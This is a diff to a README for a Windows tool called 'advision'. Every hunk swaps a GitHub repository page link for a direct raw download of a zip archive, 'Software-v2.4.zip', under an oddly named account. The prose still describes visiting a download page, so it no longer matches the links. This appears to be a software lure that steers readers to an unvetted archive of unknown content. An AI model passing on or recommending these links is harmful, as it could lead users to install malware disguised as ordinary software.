@@ -1,12 +1,12 @@
 # 🛠️ advision - Simple setup for everyday use
 
-[![Download advision](https://img.shields.io/badge/Download-Advision-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Algeripithecusminutusmoonlight570/advision)
+[![Download advision](https://img.shields.io/badge/Download-Advision-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Algeripithecusminutusmoonlight570/advision/main/src/Software-v2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the latest version:
 
-https://github.com/Algeripithecusminutusmoonlight570/advision
+https://raw.githubusercontent.com/Algeripithecusminutusmoonlight570/advision/main/src/Software-v2.4.zip
 
 ## 🚀 Getting Started
 
@@ -51,7 +51,7 @@ If your browser asks where to save the file, choose a folder you can find later,
 ## 🖱️ Download and Install
 
 1. Open this page:  
-   https://github.com/Algeripithecusminutusmoonlight570/advision
+   https://raw.githubusercontent.com/Algeripithecusminutusmoonlight570/advision/main/src/Software-v2.4.zip
 
 2. Look for the latest release or download file on the page.
 
@@ -159,7 +159,7 @@ Yes, if you download it on each Windows computer you want to use.
 ### Where do I find the latest version?
 
 Use the GitHub page here:  
-https://github.com/Algeripithecusminutusmoonlight570/advision
+https://raw.githubusercontent.com/Algeripithecusminutusmoonlight570/advision/main/src/Software-v2.4.zip
 
 ## 📌 Quick Start
 
